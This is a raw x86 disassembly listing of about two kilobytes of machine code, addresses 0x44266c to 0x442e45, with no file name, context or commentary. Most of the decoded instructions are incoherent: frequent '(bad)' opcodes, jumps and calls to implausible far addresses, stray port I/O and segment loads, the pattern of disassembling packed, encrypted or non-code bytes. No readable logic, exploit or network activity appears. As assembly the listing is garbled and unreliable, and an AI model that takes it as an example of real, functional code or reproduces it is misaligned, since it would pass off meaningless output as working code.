  44266c:	add    BYTE PTR [edx-0x1c76ff29],bh
  442672:	daa    
  442673:	je     0x442639
  442675:	or     esi,DWORD PTR [ebx+0x74dd5d4c]
  44267b:	mov    ah,0xcc
  44267d:	out    dx,eax
  44267e:	jecxz  0x44264b
  442680:	int3   
  442681:	iret   
  442682:	jecxz  0x44264f
  442684:	int3   
  442685:	push   esi
  442686:	mov    ds:0x53cf83eb,al
  44268b:	jl     0x4426e2
  44268d:	stos   DWORD PTR es:[edi],eax
  44268e:	or     BYTE PTR [edi+0x7cdff40f],dh
  442694:	ror    edx,0xf6
  442697:	pop    es
  442698:	or     edi,DWORD PTR [edx+0x17457e6d]
  44269e:	lahf   
  44269f:	inc    edx
  4426a0:	test   al,0xd2
  4426a2:	pop    ebx
  4426a3:	stos   DWORD PTR es:[edi],eax
  4426a4:	mov    DWORD PTR [esi-0x48ba817b],eax
  4426aa:	lahf   
  4426ab:	inc    edx
  4426ac:	mov    eax,0x89bb5bd2
  4426b1:	add    BYTE PTR [esi+0x54c02495],al
  4426b7:	mov    al,ds:0xe8c60c7a
  4426bc:	jae    0x4426d8
  4426be:	nop
  4426bf:	sbb    al,0x8a
  4426c1:	fwait
  4426c2:	or     edx,edi
  4426c4:	add    BYTE PTR [eax],al
  4426c6:	cld    
  4426c7:	lea    ecx,[ebx]
  4426c9:	inc    edi
  4426ca:	and    eax,0xd74d43d6
  4426cf:	mov    ds:0x16e74d4b,eax
  4426d4:	sub    al,0xc2
  4426d6:	mov    ecx,0x13757cc4
  4426db:	mov    ds:0xd2ae8909,al
  4426e0:	scas   eax,DWORD PTR es:[edi]
  4426e1:	bswap  ebx
  4426e3:	(bad)  
  4426e4:	add    BYTE PTR [eax+0x7b804a62],dl
  4426ea:	daa    
  4426eb:	xchg   esp,eax
  4426ec:	add    esi,DWORD PTR [ebx+0x5c]
  4426ef:	push   0x9f63f780
  4426f4:	adc    DWORD PTR [esi-0x38372be1],eax
  4426fa:	xor    al,0x35
  4426fc:	jp     0x442740
  4426fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4426ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  442700:	les    edi,FWORD PTR [ebp-0x5e]
  442703:	test   DWORD PTR ds:0x861c1f8b,esp
  442709:	adc    BYTE PTR [ebp+0x63400cf5],ah
  44270f:	xor    BYTE PTR [ebx],al
  442711:	mov    ebp,DWORD PTR [edi]
  442713:	add    BYTE PTR [edx+ecx*1-0xcf1f00],al
  44271a:	mov    dl,BYTE PTR [edx-0x47]
  44271d:	push   es
  44271e:	and    DWORD PTR [edx+0x2c],0x62
  442722:	mov    edi,0x33164
  442727:	(bad)  
  442728:	inc    edx
  44272a:	push   esi
  44272b:	fst    DWORD PTR [ecx+eiz*2-0x3d]
  44272f:	mov    cl,0x97
  442731:	std    
  442732:	jmp    DWORD PTR [edx+0x30]
  442735:	ss ret 
  442737:	lods   al,BYTE PTR ds:[esi]
  442738:	xor    eax,0xcdae8369
  44273d:	test   al,0x0
  44273f:	scas   eax,DWORD PTR es:[edi]
  442740:	sub    eax,0xfe3a3b3e
  442745:	in     eax,dx
  442746:	cmp    ebp,DWORD PTR [ecx]
  442748:	(bad)  
  442749:	std    
  44274a:	mov    BYTE PTR [edi+0x6201b68c],ch
  442750:	xor    BYTE PTR [ebx],al
  442752:	mov    ebp,DWORD PTR [eax]
  442754:	lods   eax,DWORD PTR ds:[esi]
  442755:	push   0xba33621c
  44275a:	ins    BYTE PTR es:[edi],dx
  44275b:	lahf   
  44275c:	push   esp
  44275d:	call   ecx
  44275f:	cmp    ecx,ebx
  442761:	aaa    
  442762:	jl     0x4427d0
  442764:	cwde   
  442765:	push   0xfffffffd
  442767:	pop    ebp
  442768:	mov    ds:0xd13f8efe,eax
  44276d:	pop    esp
  44276e:	(bad)  
  44276f:	dec    esp
  442770:	(bad)  
  442771:	fs cli 
  442773:	dec    esi
  442774:	aam    0x6a
  442776:	cld    
  442777:	arpl   WORD PTR [ebp+0x15005ee3],sp
  44277d:	push   esi
  44277e:	and    DWORD PTR [ebx],eax
  442780:	or     eax,0xa160c44e
  442785:	in     eax,0xa9
  442787:	imul   ebp,ebx,0x60bb6793
  44278d:	fldl2t 
  44278f:	add    edi,DWORD PTR [ecx-0x30]
  442792:	ins    BYTE PTR es:[edi],dx
  442793:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  442794:	pop    esi
  442795:	fldl2t 
  442797:	add    esp,DWORD PTR [edx+0x49]
  44279a:	inc    edi
  44279b:	(bad)  
  44279c:	es aam 0x5d
  44279f:	imul   esp,DWORD PTR [ecx-0x73],0x19e1a7e4
  4427a6:	jmp    0x442811
  4427a8:	jmp    0x44274f
  4427aa:	in     al,0x87
  4427ac:	loope  0x4427bf
  4427ae:	out    0x75,eax
  4427b0:	cmp    esp,DWORD PTR [ebp+0x14]
  4427b3:	adc    al,0x71
  4427b5:	sbb    DWORD PTR [ebp+edx*8-0x3a],ebx
  4427b9:	lds    eax,FWORD PTR [edi]
  4427bb:	xchg   DWORD PTR [esi-0x60],esi
  4427be:	jmp    0x972caa3a
  4427c3:	minps  xmm5,xmm0
  4427c6:	mov    cs,WORD PTR [edi-0x61]
  4427c9:	pop    ebp
  4427ca:	bound  edi,QWORD PTR [eax+0x76]
  4427cd:	jg     0x44282f
  4427cf:	pop    es
  4427d0:	pushf  
  4427d1:	call   0x7f81374c
  4427d6:	ss inc edi
  4427d8:	lahf   
  4427d9:	pop    ebp
  4427da:	add    BYTE PTR [edx+0x6a],ah
  4427dd:	loope  0x442764
  4427df:	popf   
  4427e0:	add    BYTE PTR [edx-0x581dbf6b],dl
  4427e6:	mov    ecx,esp
  4427e8:	jb     0x442795
  4427ea:	pop    esp
  4427eb:	call   0xf75536d9
  4427f0:	push   cs
  4427f1:	pusha  
  4427f2:	xchg   BYTE PTR [esi],ch
  4427f4:	mov    cl,0x35
  4427f6:	in     al,dx
  4427f7:	mov    edi,0x456995a4
  4427fc:	test   eax,0x93d5861
  442801:	xchg   ecx,eax
  442802:	sahf   
  442803:	inc    eax
  442804:	jmp    0xd320c6f1
  442809:	dec    esi
  44280a:	push   ecx
  44280b:	adc    BYTE PTR [esi+eiz*1],ah
  44280e:	fldenv ds:0xd95feb
  442814:	jo     0x44283b
  442816:	sub    eax,0x992519b8
  44281b:	add    BYTE PTR [esp+eiz*2],al
  44281e:	fild   DWORD PTR [eax]
  442820:	jmp    0xea20febf
  442825:	pusha  
  442826:	fld    DWORD PTR [eax]
  442828:	xchg   edx,eax
  442829:	gs fs cmp eax,0xd4d5d8f5
  442830:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  442831:	popf   
  442832:	xor    eax,0xd961e913
  442837:	mov    DWORD PTR [esi+edi*1],esp
  44283a:	fs dec ebp
  44283c:	fstp   st(6)
  44283e:	jmp    0x70f8:0xd5d9a933
  442845:	add    BYTE PTR [ebp+0x31ac8905],ah
  44284b:	fs inc ebp
  44284d:	push   ebp
  44284e:	into   
  44284f:	fld    DWORD PTR [eax]
  442851:	jmp    0x12454b7
  442856:	jb     0x442808
  442858:	call   0x48accbe8
  44285d:	inc    DWORD PTR [edx-0x41763b68]
  442863:	xor    ecx,DWORD PTR [ecx-0x11a168b3]
  442869:	add    esi,ebp
  44286b:	loopne 0x44289a
  44286d:	push   esp
  44286e:	mov    eax,0xc1eb00db
  442873:	pop    esp
  442874:	out    dx,al
  442875:	add    bh,BYTE PTR [esi]
  442877:	in     eax,0x2d
  442879:	push   eax
  44287a:	leave  
  44287b:	fild   DWORD PTR [eax]
  44287d:	psignw mm0,QWORD PTR [ecx]
  442881:	add    BYTE PTR [ebx+0x121c4564],bh
  442887:	scas   eax,DWORD PTR es:[edi]
  442888:	lock jmp 0x442908
  44288b:	dec    cx
  44288d:	add    BYTE PTR [eax],al
  44288f:	xchg   edi,eax
  442890:	les    ecx,FWORD PTR [ebx+0x4d8b114e]
  442896:	mov    ebx,0xf1e46564
  44289b:	sbb    al,0x2a
  44289d:	ret    0x9f03
  4428a0:	adc    DWORD PTR [edi],ecx
  4428a2:	in     al,dx
  4428a3:	fimul  DWORD PTR [ebx+0x6d2940c8]
  4428a9:	or     al,BYTE PTR [eax]
  4428ab:	std    
  4428ac:	lahf   
  4428ad:	adc    BYTE PTR [eax],al
  4428af:	pop    ebp
  4428b0:	bound  esi,QWORD PTR ds:0x6ec4e012
  4428b6:	push   ds
  4428b7:	mov    al,0x9f
  4428b9:	lock (bad) 
  4428bc:	fimul  DWORD PTR [ebx-0x3f2224b3]
  4428c2:	mov    al,BYTE PTR [edi]
  4428c4:	jecxz  0x44284e
  4428c6:	dec    ebp
  4428c7:	sbb    esp,DWORD PTR [esi+0x3d]
  4428ca:	fcomp  QWORD PTR ds:0x6207f466
  4428d0:	mov    bh,BYTE PTR es:0x33059b70
  4428d7:	sub    eax,edi
  4428d9:	adc    BYTE PTR ds:[edx+0x50458a1e],al
  4428e0:	jnp    0x4428a6
  4428e2:	sub    ebx,DWORD PTR [eax]
  4428e4:	jl     0x4428ae
  4428e6:	mov    ebx,DWORD PTR [edi-0x48]
  4428e9:	mov    ch,0x1
  4428eb:	bound  eax,QWORD PTR [eax]
  4428ed:	add    edx,ebx
  4428ef:	sar    BYTE PTR [ebx+0x46],0xec
  4428f3:	mov    cl,0x17
  4428f5:	mov    eax,DWORD PTR [ebp-0x36]
  4428f8:	mov    DWORD PTR [esi],edi
  4428fa:	enter  0x4ce7,0x8e
  4428fe:	add    BYTE PTR [edx+0x0],ah
  442901:	add    eax,DWORD PTR [ebx]
  442903:	stos   BYTE PTR es:[edi],al
  442904:	mov    ch,0x7
  442906:	mov    ecx,0x850c7de9
  44290b:	stc    
  44290c:	add    BYTE PTR [ebx],al
  44290e:	add    BYTE PTR [eax],al
  442910:	(bad)  
  442911:	fcmovnb st,st(6)
  442913:	sub    esp,DWORD PTR [eax+0x7a6d3579]
  442919:	lea    ecx,[ebx-0x9]
  44291c:	mov    edx,0x62000301
  442921:	jae    0x4428ff
  442923:	mov    edx,DWORD PTR [edi]
  442925:	dec    eax
  442926:	mov    ecx,eax
  442928:	(bad)  
  442929:	or     eax,0x7e9c90
  44292e:	add    eax,DWORD PTR [eax]
  442930:	bound  edx,QWORD PTR [ecx-0x1c]
  442933:	jge    0x442958
  442935:	in     eax,dx
  442936:	cli    
  442937:	jge    0x44295b
  442939:	adc    al,0x7
  44293b:	test   DWORD PTR [edx+0x61d12397],edx
  442941:	jo     0x4428c8
  442943:	dec    ebp
  442944:	sub    bl,BYTE PTR [ebx-0x1]
  442947:	mov    esi,0x461d9a7
  44294c:	(bad)  
  44294d:	fldl2t 
  44294f:	or     BYTE PTR [edi+0x9],0xeb
  442953:	mov    ebx,0x3e9160d
  442958:	pushf  
  442959:	fsub   DWORD PTR [ebp-0x307429a0]
  44295f:	cmp    dl,BYTE PTR [edi+0x1987de05]
  442965:	fldl2t 
  442967:	add    ebp,ecx
  442969:	mov    ds:0xe8050f19,eax
  44296e:	jb     0x4429b9
  442970:	data16 out 0x56,al
  442973:	and    BYTE PTR [eax],al
  442975:	xor    dl,dl
  442977:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  442978:	jmp    DWORD PTR [ebp+0x5f]
  44297b:	aad    0xfe
  44297d:	lods   eax,DWORD PTR ds:[esi]
  44297e:	adc    eax,0xb9a67972
  442983:	je     0x442980
  442985:	fisttp DWORD PTR [ebx+0x290f3b1d]
  44298b:	out    dx,al
  44298c:	xchg   DWORD PTR [eax+0x16],esp
  44298f:	(bad)  
  442990:	(bad)  
  442991:	fldcw  WORD PTR [ebx-0x744f772b]
  442997:	loope  0x442923
  442999:	daa    
  44299a:	adc    eax,0x61865070
  44299f:	cwde   
  4429a0:	mov    ch,BYTE PTR [edi]
  4429a2:	add    DWORD PTR [edx+0x50],esp
  4429a5:	call   0xd220:0xe98bdd63
  4429ac:	leave  
  4429ad:	jmp    0x44294d
  4429af:	xchg   ecx,eax
  4429b0:	mov    ebx,0x3e9d963
  4429b5:	popa   
  4429b6:	sub    bh,BYTE PTR [edx-0x7251861d]
  4429bc:	jb     0x442a0d
  4429be:	in     ax,dx
  4429c0:	pop    eax
  4429c1:	into   
  4429c2:	imul   eax,DWORD PTR [eax],0x2bcbece6
  4429c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4429c9:	jmp    0x839a:0xa3f57619
  4429d0:	daa    
  4429d1:	arpl   ax,bx
  4429d3:	rcl    BYTE PTR [edx],0xab
  4429d6:	std    
  4429d7:	jno    0x442a1b
  4429d9:	add    al,ch
  4429db:	xchg   BYTE PTR [edx+esi*2-0x5b74ce66],bh
  4429e2:	pop    ecx
  4429e3:	dec    esp
  4429e4:	add    ecx,ebp
  4429e6:	popa   
  4429e7:	(bad)  
  4429e9:	inc    esi
  4429ea:	pusha  
  4429eb:	and    al,0x89
  4429ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4429ee:	lods   eax,DWORD PTR ds:[esi]
  4429ef:	bound  ecx,QWORD PTR [ebp+0x41]
  4429f2:	loopne 0x442a05
  4429f4:	add    DWORD PTR [ecx+ebx*2+0x60b5fa5a],ebx
  4429fb:	fld    DWORD PTR [eax]
  4429fd:	adc    ch,BYTE PTR [eax+0x58]
  442a00:	clc    
  442a01:	jmp    0x442a2d
  442a03:	loope  0x442986
  442a05:	repz adc bh,dl
  442a08:	add    cl,ch
  442a0a:	adc    BYTE PTR [edi-0x75],bh
  442a0d:	mov    edi,0x720c86eb
  442a12:	fs popa 
  442a14:	add    al,0x79
  442a16:	fcmovnu st,st(3)
  442a18:	mov    ah,BYTE PTR [edx+eiz*2]
  442a1b:	bound  edi,QWORD PTR [eax+ebx*2]
  442a1e:	popa   
  442a1f:	pusha  
  442a20:	(bad)  
  442a21:	jno    0x442a40
  442a23:	add    DWORD PTR [ebx],ebp
  442a25:	mov    eax,ds:0x600212a1
  442a2a:	mov    ch,0x29
  442a2c:	pop    esi
  442a2d:	jo     0x4429e1
  442a2f:	imul   eax,DWORD PTR [edx],0xf70bc090
  442a35:	xchg   esi,eax
  442a36:	fcmovnbe st,st(5)
  442a38:	clc    
  442a39:	fs test DWORD PTR es:[ecx],ebx
  442a3d:	add    BYTE PTR [eax],al
  442a3f:	adc    DWORD PTR [ebx+0x7ac933e4],esi
  442a45:	mov    DWORD PTR [ebp+0x9],edx
  442a48:	popa   
  442a49:	inc    ebp
  442a4a:	call   0x4054c614
  442a4f:	xchg   ebx,eax
  442a50:	mov    ah,0x11
  442a52:	mov    edi,DWORD PTR [esi+0x790c89e7]
  442a58:	bound  esi,QWORD PTR ds:0xecac80d8
  442a5e:	(bad)  
  442a5f:	out    dx,eax
  442a60:	pop    edx
  442a61:	add    BYTE PTR [eax],al
  442a63:	sti    
  442a64:	xlat   BYTE PTR ds:[ebx]
  442a65:	mov    eax,DWORD PTR [ebp+0x7]
  442a68:	xlat   BYTE PTR ds:[ebx]
  442a69:	or     BYTE PTR [ebx+0x5f5bf006],cl
  442a6f:	push   edx
  442a70:	in     eax,dx
  442a71:	xor    eax,eax
  442a73:	or     eax,0x785dd561
  442a78:	mov    dl,0x4f
  442a7a:	mov    eax,0xd7ca
  442a7f:	std    
  442a80:	pusha  
  442a81:	aad    0x5d
  442a83:	js     0x442ae7
  442a85:	out    dx,eax
  442a86:	push   ebp
  442a87:	inc    eax
  442a88:	or     DWORD PTR [ecx+0xd77bec],eax
  442a8e:	add    dl,ch
  442a90:	fwait
  442a91:	pusha  
  442a92:	inc    esp
  442a93:	jnp    0x442a5d
  442a95:	mov    ch,0x89
  442a97:	(bad)  ss:[edx-0x10ed547b]
  442a9e:	push   edx
  442aa0:	(bad)  
  442aa1:	int3   
  442aa2:	std    
  442aa3:	add    BYTE PTR [esp+edx*1+0x12d39589],ch
  442aaa:	out    dx,eax
  442aab:	inc    edx
  442aad:	jae    0x442a73
  442aaf:	std    
  442ab0:	cld    
  442ab1:	adc    eax,0x140bb589
  442ab6:	out    dx,eax
  442ab7:	jmp    DWORD PTR [edx+0x79]
  442aba:	mov    dh,0xc4
  442abc:	aas    
  442abd:	fs hlt 
  442abf:	pop    esi
  442ac0:	out    0xb5,al
  442ac2:	sti    
  442ac3:	cmc    
  442ac4:	sub    eax,0xd7845d94
  442ac9:	pop    esp
  442aca:	div    bh
  442acc:	sbb    eax,0x2a9590db
  442ad1:	jle    0x442ac7
  442ad3:	test   DWORD PTR [esp+eax*4-0x53f84382],0x5dee5ef4
  442ade:	ret    
  442adf:	cmc    
  442ae0:	cmc    
  442ae1:	fwait
  442ae2:	pop    ebp
  442ae3:	test   BYTE PTR [edi-0x1a08096c],bh
  442ae9:	lods   al,BYTE PTR ds:[esi]
  442aea:	test   BYTE PTR [ebp-0x2e],bh
  442aed:	(bad)
  442af0:	jmp    0xe7cd2a3a
  442af5:	call   0x7e0a22f0
  442afa:	ds cld 
  442afc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  442afd:	jge    0x442b32
  442aff:	cmc    
  442b00:	mov    ch,0xdb
  442b02:	add    al,BYTE PTR [eax]
  442b04:	arpl   WORD PTR [eax],ax
  442b06:	mov    bh,BYTE PTR [ebp+0x0]
  442b09:	scas   al,BYTE PTR es:[edi]
  442b0a:	or     eax,0x40e9f7fb
  442b0f:	imul   DWORD PTR [eax+0x72]
  442b12:	retf   0x3c
  442b15:	fstp   TBYTE PTR [ebp-0x20]
  442b18:	cmc    
  442b19:	test   DWORD PTR [ebx],ebp
  442b1b:	sti    
  442b1c:	or     eax,0x430ed2
  442b21:	jmp    0x9f7823f3
  442b26:	sub    BYTE PTR [ebx],bl
  442b28:	add    BYTE PTR [edx+0x0],ah
  442b2b:	vmpsadbw xmm2,xmm2,XMMWORD PTR [ecx-0x75],0x46
  442b32:	fnstcw WORD PTR [ebp*8-0x469ed5b]
  442b39:	dec    ebp
  442b3a:	mov    esp,0xd9a21231
  442b3f:	xchg   ebp,eax
  442b40:	enter  0x251e,0xad
  442b44:	enter  0x2526,0xa5
  442b48:	enter  0x251e,0xb2
  442b4c:	or     BYTE PTR [esi+0x79],bl
  442b4f:	sbb    eax,0x2bd68704
  442b54:	add    al,0x62
  442b56:	add    BYTE PTR [ebx+0x3],ah
  442b59:	(bad)  
  442b5a:	fldenv [edx-0x5]
  442b5d:	lods   al,BYTE PTR ds:[esi]
  442b5e:	pop    esi
  442b5f:	pop    ebx
  442b60:	aas    
  442b61:	and    ecx,DWORD PTR [ebp-0x73037f2a]
  442b67:	ficom  DWORD PTR [esi-0x27]
  442b6a:	adc    DWORD PTR [ebx+0x1d],esp
  442b6d:	add    al,ch
  442b6f:	call   0x616047d5
  442b74:	clc    
  442b75:	inc    ebx
  442b76:	and    ebx,DWORD PTR [edi+ecx*1+0x71]
  442b7a:	shr    DWORD PTR [ebp+0x24a6c6af],cl
  442b80:	adc    eax,0x2d249ec8
  442b85:	enter  0x24a6,0x25
  442b89:	enter  0x249e,0x62
  442b8d:	sti    
  442b8e:	das    
  442b8f:	pop    esi
  442b90:	cmc    
  442b91:	push   esp
  442b92:	jmp    0xd9971d42
  442b97:	adc    BYTE PTR [edx],ah
  442b99:	(bad)  
  442b9a:	hlt    
  442b9b:	and    BYTE PTR [edx+0x48],0x66
  442b9f:	fisttp QWORD PTR fs:0xf8246011
  442ba6:	sbb    al,0xfe
  442ba8:	jmp    0x11d4735
  442bad:	(bad)
  442bb2:	xchg   esp,eax
  442bb3:	add    BYTE PTR [edi-0x31],ch
  442bb6:	fisubr DWORD PTR [ebp+0x1c]
  442bb9:	jmp    0x6245051f
  442bbe:	stos   BYTE PTR es:[edi],al
  442bbf:	fst    QWORD PTR [ebx+0x37]
  442bc2:	(bad)
  442bc6:	in     al,0x4d
  442bc8:	add    al,0x64
  442bca:	and    DWORD PTR [eax-0x22c49dfe],ecx
  442bd0:	ins    DWORD PTR es:[edi],dx
  442bd1:	fld    QWORD PTR [eax]
  442bd3:	push   esp
  442bd4:	add    BYTE PTR [esi+0x4e],ch
  442bd7:	fcom   QWORD PTR [esi-0x1e4d8dfc]
  442bdd:	mov    ebx,DWORD PTR [eax-0x14]
  442be0:	push   eax
  442be1:	cmp    ebp,DWORD PTR [esi]
  442be3:	test   eax,ebp
  442be5:	jge    0x442c17
  442be7:	jge    0x442bdd
  442be9:	mov    esi,DWORD PTR [edx]
  442beb:	xor    al,0x18
  442bed:	nop
  442bee:	arpl   WORD PTR [ecx+0x63],di
  442bf1:	or     al,0xe8
  442bf3:	jmp    0xd9fb2ddd
  442bf8:	jmp    0x7f17903d
  442bfd:	lock bound ebp,QWORD PTR [edx]
  442c00:	aad    0x8b
  442c02:	mov    ah,0x69
  442c04:	(bad)  
  442c05:	stc    
  442c06:	ret    0x80af
  442c09:	pushf  
  442c0a:	lahf   
  442c0b:	add    al,0xa8
  442c0d:	mov    ecx,DWORD PTR [edx+edi*1]
  442c10:	sbb    al,0xc4
  442c12:	sbb    eax,0xb5c4159d
  442c17:	call   0xc415:0x9aadc415
  442c1e:	bound  edi,QWORD PTR [ebx-0x62]
  442c21:	mov    edi,DWORD PTR [ebp-0xa1f]
  442c27:	jp     0x442c05
  442c29:	add    BYTE PTR [ebx-0x10],dl
  442c2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  442c2d:	or     BYTE PTR [edi-0x40],dl
  442c30:	mov    ah,bh
  442c32:	test   al,dh
  442c34:	jg     0x442c5e
  442c36:	test   DWORD PTR [eax],eax
  442c38:	add    al,0x89
  442c3a:	adc    al,0xff
  442c3c:	dec    esi
  442c3d:	mov    ah,0x6
  442c3f:	inc    eax
  442c40:	dec    ebx
  442c41:	jle    0x442c43
  442c43:	push   0x4b
  442c45:	jle    0x442c47
  442c47:	push   0x3b
  442c49:	jle    0x442c4b
  442c4b:	(bad)  
  442c4c:	cmp    ebp,edx
  442c4e:	add    BYTE PTR [eax],al
  442c50:	or     eax,DWORD PTR [ecx*8-0x7ced7b02]
  442c57:	les    ecx,FWORD PTR [edi]
  442c59:	mov    cl,0x5b
  442c5b:	mov    ebx,DWORD PTR [esi-0x7fa93c58]
  442c61:	adc    BYTE PTR [eax],0x85
  442c64:	lea    ecx,[ebx-0x1fd97d0a]
  442c6a:	add    BYTE PTR [ebp+0x5e],dh
  442c6d:	adc    al,BYTE PTR ds:0x9bbd58
  442c73:	push   0xffffffcb
  442c75:	jge    0x442c77
  442c77:	push   0xffffffbb
  442c79:	jge    0x442c7b
  442c7b:	push   0xffffffbb
  442c7d:	sbb    BYTE PTR [eax],al
  442c7f:	push   ss
  442c80:	retf   
  442c81:	fild   DWORD PTR [eax]
  442c83:	call   0x333fa8
  442c88:	cmp    BYTE PTR [ecx],bl
  442c8a:	add    al,0x5e
  442c8c:	les    ebp,FWORD PTR [ebx+ecx*4-0x7ceb091b]
  442c93:	dec    DWORD PTR [ecx-0x6bb01b7b]
  442c99:	inc    eax
  442c9a:	out    dx,al
  442c9b:	add    eax,DWORD PTR [eax]
  442c9d:	sbb    BYTE PTR [eax],0x35
  442ca0:	hlt    
  442ca1:	bound  eax,QWORD PTR [edx]
  442ca3:	add    eax,DWORD PTR [eax]
  442ca5:	bound  edi,QWORD PTR [ecx+0x4e]
  442ca8:	hlt    
  442ca9:	fist   DWORD PTR [esp+esi*8+0x301c985]
  442cb0:	add    BYTE PTR [edx+0x7b],ah
  442cb3:	shr    BYTE PTR [ebx],0x21
  442cb6:	adc    al,0xcd
  442cb8:	out    dx,eax
  442cb9:	push   esp
  442cba:	sar    DWORD PTR [ebp-0x8],0x5a
  442cbe:	out    0x1b,eax
  442cc0:	mov    esp,DWORD PTR [edi+0x4e458408]
  442cc6:	rcl    BYTE PTR [ebx+0x4e],1
  442cc9:	xchg   ecx,eax
  442cca:	mov    eax,eax
  442ccc:	call   0xf83cbbf4
  442cd1:	loope  0x442d0f
  442cd3:	adc    ebp,ecx
  442cd5:	hlt    
  442cd6:	add    DWORD PTR [ebx],eax
  442cd8:	add    cl,bl
  442cda:	dec    ebp
  442cdb:	sbb    edx,ecx
  442cdd:	cli    
  442cde:	jmp    DWORD PTR [edi-0x7b3c9e42]
  442ce4:	lock mov WORD PTR [ebx+0x4d],ss
  442ce8:	not    DWORD PTR [edi+0x56bc7c2c]
  442cee:	jne    0x442cb3
  442cf0:	jbe    0x442d60
  442cf2:	jnp    0x442d3a
  442cf4:	adc    cl,ch
  442cf6:	out    dx,al
  442cf7:	test   bl,al
  442cf9:	mov    edx,0xc5f7f95c
  442cfe:	mov    esi,DWORD PTR [esi]
  442d00:	sbb    BYTE PTR [eax],al
  442d02:	adc    eax,0xff75353
  442d07:	add    al,0x7c
  442d09:	mov    esp,0x76c37d5e
  442d0e:	push   esi
  442d0f:	mov    eax,DWORD PTR [esi+0x10]
  442d12:	jmp    0x8b07b1ce
  442d17:	cmp    cl,bh
  442d19:	test   DWORD PTR [ebp+0x6a4972d9],0x75552fa6
  442d23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  442d24:	cmc    
  442d25:	xor    BYTE PTR [esi-0xb3ba323],0xdc
  442d2c:	jb     0x442d7f
  442d2e:	push   edx
  442d2f:	bound  esp,QWORD PTR [esi-0x2fee375]
  442d35:	cmc    
  442d36:	dec    ebp
  442d37:	push   cs
  442d38:	repnz repnz mov esp,0x7258eaf2
  442d3f:	shl    BYTE PTR [edi+0x34626e73],cl
  442d45:	sbb    al,0xa4
  442d47:	stos   BYTE PTR es:[edi],al
  442d48:	cmp    esi,edi
  442d4a:	lahf   
  442d4b:	in     eax,0x6a
  442d4d:	rcr    BYTE PTR [esi+0x54],0xa9
  442d51:	jbe    0x442d5e
  442d53:	sar    BYTE PTR [edx+0x6f],cl
  442d56:	outs   dx,DWORD PTR ds:[esi]
  442d57:	fiadd  DWORD PTR [esp+edx*1]
  442d5a:	dec    ecx
  442d5b:	lods   al,BYTE PTR ds:[esi]
  442d5c:	popa   
  442d5d:	outs   dx,DWORD PTR ds:[esi]
  442d5e:	push   edi
  442d5f:	bound  ebx,QWORD PTR [ebx+ebx*1-0x9465554]
  442d66:	add    BYTE PTR [edi+0x66c06ae5],ah
  442d6c:	push   esp
  442d6d:	sub    DWORD PTR [esi-0x6],esi
  442d70:	add    edx,ebp
  442d72:	mov    BYTE PTR [ebx],ch
  442d74:	fld    DWORD PTR [edx]
  442d76:	jns    0x442dea
  442d78:	shl    BYTE PTR [edi],cl
  442d7a:	outs   dx,BYTE PTR ds:[esi]
  442d7b:	jb     0x442ddf
  442d7d:	lods   al,BYTE PTR ds:[esi]
  442d7e:	sbb    edx,DWORD PTR [esi+eiz*4]
  442d81:	mov    eax,0x6ae52ff6
  442d86:	rcr    BYTE PTR [esi+0x54],0x29
  442d8a:	ja     0x442d47
  442d8c:	rcr    DWORD PTR [esi],1
  442d8e:	outs   dx,DWORD PTR ds:[esi]
  442d8f:	imul   esp,DWORD PTR [edx-0x74],0x13
  442d93:	jmp    0x40c12dad
  442d98:	(bad)  
  442d99:	retf   
  442d9a:	ret    0xa2a4
  442d9d:	mov    DWORD PTR [esi+ecx*4],edi
  442da0:	aad    0xae
  442da2:	cmc    
  442da3:	popaw  
  442da5:	dec    ebp
  442da6:	loop   0x442e04
  442da8:	aas    
  442da9:	adc    BYTE PTR [ecx+0x5d],ah
  442dac:	fadd   DWORD PTR [edi]
  442dae:	jg     0x442dc2
  442db0:	loop   0x442d3a
  442db2:	fld1   
  442db4:	sahf   
  442db5:	lock sub ebx,esp
  442db8:	daa    
  442db9:	ins    DWORD PTR es:[edi],dx
  442dba:	enter  0xfc88,0x6
  442dbe:	ins    BYTE PTR es:[edi],dx
  442dbf:	mov    ah,0x4
  442dc1:	neg    DWORD PTR [esi+0x19e908e8]
  442dc7:	sub    eax,0xeaf705
  442dcc:	stos   BYTE PTR es:[edi],al
  442dcd:	jmp    0xeef4ac0d
  442dd2:	jmp    0x442dbe
  442dd4:	jmp    0x3be9:0x9ac200a2
  442ddb:	outs   dx,DWORD PTR ds:[esi]
  442ddc:	jg     0x442dd0
  442dde:	mov    ebp,DWORD PTR [ecx+ebp*2-0xb46b065]
  442de5:	sahf   
  442de6:	or     al,0x6a
  442de8:	mov    ch,0xd5
  442dea:	jge    0x442e15
  442dec:	jge    0x442df0
  442dee:	cmp    edi,DWORD PTR [esi]
  442df0:	jae    0x442dd6
  442df2:	jmp    0x442dde
  442df4:	jmp    0x8be9:0x5b0200a2
  442dfb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  442dfc:	aad    0xd0
  442dfe:	clc    
  442dff:	lahf   
  442e00:	jo     0x442e62
  442e02:	inc    ebp
  442e03:	add    DWORD PTR [esp+ebx*4],ebp
  442e06:	push   ecx
  442e07:	push   ss
  442e08:	adc    bl,ch
  442e0a:	and    DWORD PTR ds:0xc08e65,0x27
  442e11:	mov    eax,DWORD PTR cs:[ebp-0x61]
  442e15:	bound  eax,QWORD PTR [ebp-0x8]
  442e18:	add    BYTE PTR [edx],ah
  442e1a:	mov    esi,edi
  442e1c:	mov    al,ds:0x40f02b1f
  442e21:	or     BYTE PTR [ebx+ebp*1+0x40],ch
  442e25:	dec    esi
  442e26:	jae    0x442e3d
  442e28:	add    BYTE PTR [esp+eiz*8+0x78540789],dl
  442e2f:	inc    DWORD PTR [eax]
  442e31:	pushf  
  442e32:	push   es
  442e33:	mov    DWORD PTR [esi+ecx*8+0xcffefd5],edi
  442e3a:	cwde   
  442e3b:	mov    DWORD PTR [ebp+0x17],ecx
  442e3e:	rcr    dl,cl
  442e40:	jae    0x442e84
  442e42:	popa   
  442e43:	ins    DWORD PTR es:[edi],dx
  442e44:	clc    
  442e45:	mov    al,0x7c
